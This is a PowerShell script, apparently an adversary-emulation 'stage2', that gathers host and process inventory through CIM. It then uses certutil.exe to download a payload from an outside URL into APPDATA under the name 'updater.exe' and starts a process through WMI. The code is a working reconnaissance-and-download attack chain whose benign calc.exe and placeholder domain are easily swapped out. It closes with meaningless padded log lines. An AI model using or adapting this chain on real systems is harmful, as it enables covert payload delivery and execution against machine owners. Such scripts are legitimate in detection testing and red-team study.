<#
.SYNOPSIS
    WMI and signed-binary reconnaissance workflow.

.DESCRIPTION
    Collects process and system inventory through CIM, downloads a
    payload stage with a signed Windows binary, then creates
    a benign process through WMI and records the result.

.NOTES
    Process creation uses the WMI provider.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'http://adatum.com/downloads/payload.bin',
    [string]$PayloadPath = "$env:APPDATA\updater.exe",
    [string]$StageLog = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Inventory
function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

# LOLBin chain
function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = '',
        [string]$DestinationPath = ""
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $TransferResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $TransferResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Preparing working directory"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Collecting host metadata"
Write-Verbose "stage marker 29 reached"
